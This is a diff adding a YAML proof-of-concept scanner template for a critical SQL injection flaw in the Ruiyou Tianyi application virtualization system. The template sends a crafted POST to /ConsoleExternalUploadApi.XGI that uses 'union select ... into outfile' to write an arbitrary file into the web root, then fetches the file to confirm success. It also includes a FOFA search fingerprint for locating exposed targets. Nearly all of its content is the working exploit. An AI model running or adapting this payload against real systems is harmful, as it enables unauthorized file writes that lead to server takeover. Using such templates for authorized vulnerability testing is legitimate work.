@@ -1,0 +1,23 @@
+id: poc-yaml-gwt-system-consoleexternaluploadapi-xgi-rce
+info:
+  name: 瑞友天翼应用虚拟化系统 ConsoleExternalUploadApi sql注入任意写入漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 任意写入
+  finger: 瑞友天翼应用虚拟化系统
+  fofa: body="/CasMain.XGI"
+variables:
+  filename: to_lower(random_str(10))
+  t1: random_int(100,1000)
+requests:
+- method: POST
+  path: /ConsoleExternalUploadApi.XGI
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: key=ServerIPType'+union+select+'test{{.t1}}'+into+outfile+'..\\\\..\\\\WebRoot\\\\{{.filename}}.xgi&initParams=x&sign=x
+  expression: "status_code == 200 && \ncontains(body,\"\\\"result\\\":0\")\n"
+- method: GET
+  path: /{{.filename}}.xgi
+  expression: "status_code == 200 && \ncontains(body,t1)\n"
+transport: http
